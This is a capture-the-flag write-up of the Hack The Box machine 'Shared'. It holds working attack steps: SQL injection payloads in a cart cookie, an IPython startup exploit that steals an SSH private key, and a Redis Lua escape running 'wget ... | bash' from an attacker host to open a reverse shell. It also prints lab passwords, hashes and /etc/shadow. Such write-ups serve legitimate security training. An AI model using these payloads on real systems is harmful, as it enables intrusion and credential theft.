---
layout: single
title: Shared - Hack The Box
excerpt: "Shared is a medium-rated Linux machine from Hack The Box. Compared to the last few boxes I've done, this was a real smooth ride as we're basically jumping from exploit to exploit. The path for each step is clear and there are plenty of hints along the way. Looking back the box have sharpened my knowledge in some areas, while also introducing tools I've never seen or used before. For me this medium box is on the easier side of medium and didn't take many hours at all to complete. It was a fun experience and I'd recommend the box to you! "
date: 2022-08-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-shared/shared_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
tags:  
  - linux
  - medium
  - prestashop
  - sqli
  - ipython
  - redis
  - cve-2022-0543
  - ssh tunnel
---

![](/assets/images/htb-writeup-shared/shared_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

Shared is a medium-rated Linux machine from Hack The Box. Compared to the last few boxes I've done, this was a real smooth ride as we're basically jumping from exploit to exploit. The path for each step is clear and there are plenty of hints along the way. Looking back the box have sharpened my knowledge in some areas, while also introducing tools I've never seen or used before. For me this medium box is on the easier side of medium and didn't take many hours at all to complete. It was a fun experience and I'd recommend the box to you! 

----------------

# USER
### Step 1
```
➜  /htb nmap -Pn -n -p- 10.10.11.172
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

➜  /htb nmap -Pn -n -p22,80,443 -sCV 10.10.11.172
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)
|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)
|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to http://shared.htb
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_http-title: Did not follow redirect to https://shared.htb
| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US
| Not valid before: 2022-03-20T13:37:14
|_Not valid after:  2042-03-15T13:37:14
| tls-nextprotoneg: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Port 80 is redirecting to `http://shared.htb` and from there to `https://shared.htb`
```
➜  /htb curl -kvs -L http://10.10.11.172
*   Trying 10.10.11.172:80...
* Connected to 10.10.11.172 (10.10.11.172) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.11.172
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.18.0
< Location: http://shared.htb
< 
> GET / HTTP/1.1
> Host: shared.htb
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.18.0
< Location: https://shared.htb/
* Clear auth, redirects to port from 80 to 443
* Issue another request to this URL: 'https://shared.htb/'
```

```
➜  webanalyze ./webanalyze -host https://shared.htb
https://shared.htb (0.7s):
    Nginx, 1.18.0 (Web servers, Reverse proxies)
    PHP,  (Programming languages)
```

![](/assets/images/htb-writeup-shared/shared01.png)

New checkout process "be sure to take a look on it!" - is that a hint maybe? Pressing "checkout" takes you to https://checkout.shared.htb, add it to `/etc/hosts`.<br>
In the footer of the page we find that the site is built using __PrestaShop__. Googling about PrestaShop we find some older and newer vulns, but in particular [one from 2022](https://build.prestashop.com/news/major-security-vulnerability-on-prestashop-websites/) where the module `blockwishlist` is vulnerable. 

The vulnerability is executed with help of SQL Injection, so lets look for a vector.

All items we add from the store are processed and saved in the cookie variable `custom_cart`, which is URL encoded and sticks out. Decode the data and playing around I find that the value field is reflected in the response. 
![](/assets/images/htb-writeup-shared/shared02.png)

Playing around with SQLi in the product ID field I find that testing `'ORDER BY 4-- -` returns "Not Found", while `'ORDER BY 3-- -` still returns the ID.
![](/assets/images/htb-writeup-shared/shared03.png)

![](/assets/images/htb-writeup-shared/shared04.png)

Further testing and I find:
```bash
## Request
custom_cart={"4HAR4XDK'OR 1=1 UNION SELECT @@version,2,3-- -":"1","2E6E8GXJ":"1"}

## Response
53GG2EF8
```

A new ID, we're getting close to something! Note that we get the same response no matter if `@@version` is at column 1,2 or 3. 
Since `4HAR4XDK` is a valid ID and will therefore return true, remove it and use an invalid ID instead.
```bash
## Request
custom_cart={"sqlihere'UNION SELECT 1,@@version,3-- -":"1","2E6E8GXJ":"1"}

## Response
10.5.15-MariaDB-0+deb11u1
```

We got outselves a foothold!


### Step 2
Enumerate the database manually go gain [usefull information](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635).
```bash
## DATABSE
request: custom_cart={"sqlihere'UNION SELECT 1,database(),3-- -":"1","2E6E8GXJ":"1"}
response: checkout

## USER
request: custom_cart={"sqlihere'UNION SELECT 1,user(),3-- -":"1","2E6E8GXJ":"1"}
response: checkout@localhost

## TABLES
request: custom_cart={"sqlihere'UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -":"1","2E6E8GXJ":"1"}
response: ALL_PLUGINS,APPLICABLE_ROLES,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENABLED_ROLES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEYWORDS,KEY_CACHES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,SQL_FUNCTIONS,SYSTEM_VARIABLES,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,CLIENT_STATISTICS,INDEX_STATISTICS,INNODB_SYS_DATAFILES,GEOMETRY_COLUMNS,INNODB_SYS_TABLESTATS,SPATIAL_REF_SYS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_CMP_PER_INDEX,INNODB_METRICS,INNODB_LOCK_WAITS,INNODB_CMP,THREAD_POOL_WAITS,INNODB_CMP_RESET,THREAD_POOL_QUEUES,TABLE_STATISTICS,INNODB_SYS_FIELDS,INNODB_BUFFER_PAGE_LRU,INNODB_LOCKS,INNODB_FT_INDEX_TABLE,INNODB_CMPMEM,THREAD_POOL_GROUPS,INNODB_CMP_PER_INDEX_RESET,INNODB_SYS_FOREIGN_COLS,INNODB_FT_INDEX_CACHE,INNODB_BUFFER_POOL_STATS,INNODB_FT_BEING_DELETED,INNODB_SYS_FOREIGN,INNODB_CMPMEM_RESET,INNODB_FT_DEFAULT_STOPWORD,INNODB_SYS_TABLES,INNODB_SYS_COLUMNS,INNODB_FT_CONFIG,USER_STATISTICS,INNODB_SYS_TABLESPACES,INNODB_SYS_VIRTUAL,INNODB_SYS_INDEXES,INNODB_SYS_SEMAPHORE_WAITS,INNODB_MUTEXES,user_variables,INNODB_TABLESPACES_ENCRYPTION,INNODB_FT_DELETED,THREAD_POOL_STATS,user,product

## COLUMNS
request: custom_cart={"sqlihere'UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name = 'user'-- -":"1","2E6E8GXJ":"1"}
response: id,username,password

## EXTRACT DATA
request: custom_cart={"sqlihere'UNION SELECT 1,group_concat(username,0x3a,password),3 FROM user-- -":"1","2E6E8GXJ":"1"}
response: james_mason:fc895d4eddc2fc12f995e18c865cf273
```

Write that user + hash to file and crack with hashcat. 
```bash
➜  shared cat james_mason.hash                                                 
james_mason:fc895d4eddc2fc12f995e18c865cf273

➜  shared hashcat -a0 -m0 james_mason.hash /usr/share/wordlists/rockyou.txt --user

[... snip ...]
fc895d4eddc2fc12f995e18c865cf273:Soleil101                
Session..........: hashcat
Status...........: Cracked
```

Test credentials over SSH:
```bash
➜  shared ssh james_mason@shared.htb
james_mason@shared.htb password: Soleil101

james_mason@shared:~$ id && cat user.txt
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
cat: user.txt: No such file or directory
```

`user.txt` is sadly not in the possesion of james', so it looks like we need to move laterally. From `id` we can see that james have a non-standard group `developer`, lets dig deeper into this.


### Step 3
In `/opt` we find the directory `scripts_review` which is empty. The directory is owned by `developer` so we can post scripts/files here, however they are deleted after a short while. 
```bash
james_mason@shared:/opt$ ls -al
drwxrwx---  2 root developer 4096 Jul 14 13:46 scripts_review

james_mason@shared:/opt/scripts_review$ touch test
james_mason@shared:/opt/scripts_review$ ls -al
total 8
drwxrwx--- 2 root developer 4096 Aug 25 06:53 .
drwxr-xr-x 3 root root      4096 Jul 14 13:46 ..
-rw-r--r-- 1 james_mason james_mason    0 Aug 25 06:53 test

james_mason@shared:/opt/scripts_review$ ls -al
total 8
drwxrwx--- 2 root developer 4096 Aug 25 06:53 .
drwxr-xr-x 3 root root      4096 Jul 14 13:46 ..
```

Upload `pspy64` to see if we can make sense why the files are deleted.
```bash
james_mason@shared:/dev/shm$ wget http://10.10.14.4/pspy64
james_mason@shared:/dev/shm$ chmod +x pspy64 
james_mason@shared:/dev/shm$ ./pspy64
[... snip ...]
2022/08/25 06:58:01 CMD: UID=0    PID=6809   | /usr/sbin/CRON -f 
2022/08/25 06:58:01 CMD: UID=1001 PID=6811   | /bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython 
2022/08/25 06:58:01 CMD: UID=0    PID=6813   | /usr/sbin/CRON -f 
2022/08/25 06:58:01 CMD: UID=1001 PID=6812   | /usr/bin/pkill ipython 
2022/08/25 06:58:01 CMD: UID=0    PID=6814   | /bin/bash /root/c.sh 
2022/08/25 06:58:01 CMD: UID=0    PID=6815   | sleep 5 
2022/08/25 06:58:01 CMD: UID=1001 PID=6816   | /usr/bin/python3 /usr/local/bin/ipython 
2022/08/25 06:58:06 CMD: UID=0    PID=6818   | rm -rf /opt/scripts_review/* 
2022/08/25 06:58:06 CMD: UID=0    PID=6819   | /bin/bash /root/c.sh 
2022/08/25 06:58:06 CMD: UID=0    PID=6821   | 
2022/08/25 06:58:06 CMD: UID=0    PID=6820   | /bin/bash /root/c.sh 
2022/08/25 06:58:06 CMD: UID=0    PID=6822   | /bin/bash /root/c.sh 
2022/08/25 06:58:06 CMD: UID=0    PID=6825   | (s-server) 
2022/08/25 06:58:06 CMD: UID=0    PID=8501   | perl -ne s/\((\d+)\)/print " $1"/ge 
2022/08/25 06:58:06 CMD: UID=0    PID=8502   | pidof redis-server 
2022/08/25 06:58:06 CMD: UID=0    PID=8505   | /sbin/init 

```

**UID 1001** (`dan_smith`) is running a job every minute where he changes into the directory `/opt/scripts_review`, and when there starts `ipython`. 
Reading about `ipython` we find that [there's a vulnerability](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) that allows users to run code as another user, if they know where (which dir) the victim starts `ipython`.  

With this information steal dan_smith's id_rsa

```bash
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default/startup
james_mason@shared:/opt/scripts_review$ echo 'import os; os.system("cp /home/dan_smith/.ssh/id_rsa /dev/shm/dan-id_rsa && chmod 777 /dev/shm/dan-id_rsa")' > profile_default/startup/exploit.py
james_mason@shared:/opt/scripts_review$ chmod +x profile_default/startup/exploit.py

james_mason@shared:/opt/scripts_review$ ls -al /dev/shm/
total 3012
drwxrwxrwt  2 root        root             80 Aug 25 07:42 .
drwxr-xr-x 17 root        root           3080 Aug 25 03:03 ..
-rwxrwxrwx  1 dan_smith   developer      2602 Aug 25 07:47 dan-id_rsa

james_mason@shared:/opt/scripts_review$ cat /dev/shm/dan-id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Write to file, login and grab ``user.txt``.
```bash
➜  shared vim dan-id_rsa
➜  shared chmod 400 dan-id_rsa 
➜  shared ssh dan_smith@shared.htb -i dan-id_rsa 

dan_smith@shared:~$ id && cat user.txt
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
ac1d7c930a51968f97efe55963ecfe62
```

---------------------------

# ROOT
### Step 1
With manual enumeration we first see that `dan_smith` is part of `sysadmin` group, lets look for files owned by that group.
```bash
dan_smith@shared:/$ find / -group sysadmin 2> /dev/null
/usr/local/bin/redis_connector_dev
```

If we remember from earlier when we ran `pspy64` we found another line containing **redis**:
```bash
2022/08/25 06:58:06 CMD: UID=0    PID=8502   | pidof redis-server 
```

We can access the service through `redis-cli`, however everything we throw at it returns `(error) NOAUTH Authentication required.`.
Lets start hunting for credentials. Most likely we can find SQL creds somewhere in `/var/www/`.

```bash
dan_smith@shared:/var/www/checkout.shared.htb/config$ cat db.php 
<?php
define('DBHOST','localhost');
define('DBUSER','checkout');
define('DBPWD','a54$K_M4?DdT^HUk');
define('DBNAME','checkout');
?>

dan_smith@shared:/var/www/shared.htb/ps/app/config$ cat parameters.php 
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'pshop',
    'database_user' => 'pshop',
    'database_password' => 'T*k#cbND_C*WrQ9h',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'JcFbTGrwO5Jm2jLiGt5Da0PThwPCWPpht34Afzg9pehekQ19TxvUeU5Scmr9aH3J',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2022-03-06',
    'locale' => 'en-US',
    'use_debug_toolbar' => true,
    'cookie_key' => 'z7FJgNKKsqvFAkvpIRzx9NfTVNWTMdZhnpuP8Xh6aivNDB1vnPaByT9g6uU3OFQO',
    'cookie_iv' => 'aFoWzPnUUEBiTNd4t4uN66XeS37p3eUp',
    'new_cookie_key' => 'def00000f935fcfbe80eeeb1a4c68e98f394b3685e9b325f43aa713d659b0fb201d9045aa39fd9499c3498b3c1309aa69fcae9c7d7c257162f8336765eb694420d2d8ff2',
```

Testing all found passwords with all found users, including standard username ["default"](https://redis.io/commands/auth/), all fails.. 
But after a while of testing I noticed something interesting, when running the binary `redis_connector_dev` they start the service with an interesting line:
```
dan_smith@shared:/var/www/shared.htb/ps/app/config$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:22242
run_id:6eba6ae15533f2538f3bfe3067a305bf07cb1094
tcp_port:6379
uptime_in_seconds:38
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:489079
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

_"Logging to redis instance using **password**"_ - are they trying to tell me I should extract the password from this binary? 


### Step 2
Download the binary `redis_connector_dev` to your local attacking machine and run it with `ltrace` to see if we get the password.
```bash
➜  shared ltrace ./redis_connector_dev
[... snip ...]
INFO command result:
__errno_location()                                                                               = 0x7f1cf4bf46c0
getaddrinfo("localhost", nil, 0xc000092960, 0xc0000ac040)                                        = 0
freeaddrinfo(0x1a08540)                                                                          = <void>
 dial tcp [::1]:6379: connect: connection refused
+++ exited (status 0) +++
```

It dies before it has a chance to send the credentials.. setup a `nc` listener on port 6379 and try again.
```bash
➜  shared ltrace ./redis_connector_dev
[... snip ...]
INFO command result:
__errno_location()                                                                               = 0x7f9d634486c0
getaddrinfo("localhost", nil, 0xc000068960, 0xc000010050)                                        = 0
freeaddrinfo(0x10523f0)                                                                          = <void>
 i/o timeout
+++ exited (status 0) +++

➜  shared nc -lvnp 6379
listening on [any] 6379 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 46690
*2
$4
auth
$16
F2WHqJUz2WEz=Gqq
```

With the found password we are now able to authenticate and access the redis server:
```bash
dan_smith@shared:/usr/local/bin$ redis-cli -h localhost
localhost:6379> AUTH default F2WHqJUz2WEz=Gqq
OK
```

Reading about redis on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass) we find an interesting CVE to escape from LUA. Trying to run the script on the victim fails because we're lacking python3 module 'redis'.
```bash
dan_smith@shared:/dev/shm$ python3 cve-2022-0543.py 
Traceback (most recent call last):
  File "/dev/shm/cve-2022-0543.py", line 1, in <module>
    import redis
ModuleNotFoundError: No module named 'redis'
```

Instead, setup a SSH tunnel and test the script locally.
```bash
➜  shared ssh -L 6379:127.0.0.1:6379 -N -f dan_smith@shared.htb -i dan-id_rsa
➜  shared python3 cve-2022-0543.py                                        
Please input redis ip:
>>127.0.0.1
Please input redis port:
>>6379
input exec cmd:(q->exit)
>>id
Traceback (most recent call last):
  File "/htb/shared/cve-2022-0543.py", line 30, in <module>
    shell(ip,port,cmd)
  File "/htb/shared/cve-2022-0543.py", line 19, in shell
    script = r.eval(lua,0)
  File "/usr/lib/python3/dist-packages/redis/client.py", line 3131, in eval
    return self.execute_command('EVAL', script, numkeys, *keys_and_args)
  File "/usr/lib/python3/dist-packages/redis/client.py", line 901, in execute_command
    return self.parse_response(conn, command_name, **options)
  File "/usr/lib/python3/dist-packages/redis/client.py", line 915, in parse_response
    response = connection.read_response()
  File "/usr/lib/python3/dist-packages/redis/connection.py", line 739, in read_response
    response = self._parser.read_response()
  File "/usr/lib/python3/dist-packages/redis/connection.py", line 484, in read_response
    raise response
redis.exceptions.AuthenticationError: Authentication required.
```

Im not sure how to solve the code to include authentication, instead we can exploit it manually as there are two lines of code that actually does everything:
```python
line 17: lua= 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("'+cmd+'", "r"); local res = f:read("*a"); f:close(); return res'
line 19: script = r.eval(lua,0)
```

```bash
➜  shared redis-cli -h 127.0.0.1 --pass F2WHqJUz2WEz=Gqq
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
"uid=0(root) gid=0(root) groups=0(root)\n"

127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("wget -qO- http://10.10.14.4/rev.sh | bash", "r"); local res = f:read("*a"); f:close(); return res' 0

➜  shared nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.172] 39640
bash: cannot set terminal process group (23806): Inappropriate ioctl for device
bash: no job control in this shell

root@shared:/var/lib/redis# cat /root/root.txt
4d6594a804436a9950d537695c81fecc

root@shared:/var/lib/redis# cat /etc/shadow
root:$y$j9T$q/qYCzzDEBdZXpRxCa6gL/$XhNZBD56JUTsCniDDjj6UmwRnBc3A40AcbtqNzVEpJ4:19186:0:99999:7:::
daemon:*:19071:0:99999:7:::
bin:*:19071:0:99999:7:::
sys:*:19071:0:99999:7:::
sync:*:19071:0:99999:7:::
games:*:19071:0:99999:7:::
man:*:19071:0:99999:7:::
lp:*:19071:0:99999:7:::
mail:*:19071:0:99999:7:::
news:*:19071:0:99999:7:::
uucp:*:19071:0:99999:7:::
proxy:*:19071:0:99999:7:::
www-data:*:19071:0:99999:7:::
backup:*:19071:0:99999:7:::
list:*:19071:0:99999:7:::
irc:*:19071:0:99999:7:::
gnats:*:19071:0:99999:7:::
nobody:*:19071:0:99999:7:::
_apt:*:19071:0:99999:7:::
systemd-timesync:*:19071:0:99999:7:::
systemd-network:*:19071:0:99999:7:::
systemd-resolve:*:19071:0:99999:7:::
messagebus:*:19071:0:99999:7:::
sshd:*:19071:0:99999:7:::
james_mason:$y$j9T$zJMiBXFlQaVLqD8B7hPR3.$ceN5vvW/KTMQ.YeNjqT8UVo6TsKm/Dl8P1uefK6v5A1:19071:0:99999:7:::
systemd-coredump:!*:19071::::::
mysql:!:19071:0:99999:7:::
dan_smith:$y$j9T$vFQT7yf8j9/liKFLt3fr7/$Fqyc1V0r3NrAH2JkdU6N6nEz1v5jm38wUUDbOkqZzsA:19186:0:99999:7:::
redis:*:19071:0:99999:7:::

root@shared:/var/lib/redis# cat /root/.ssh/id_rsa
bash: /root/.ssh/id_rsa: No such file or directory
```
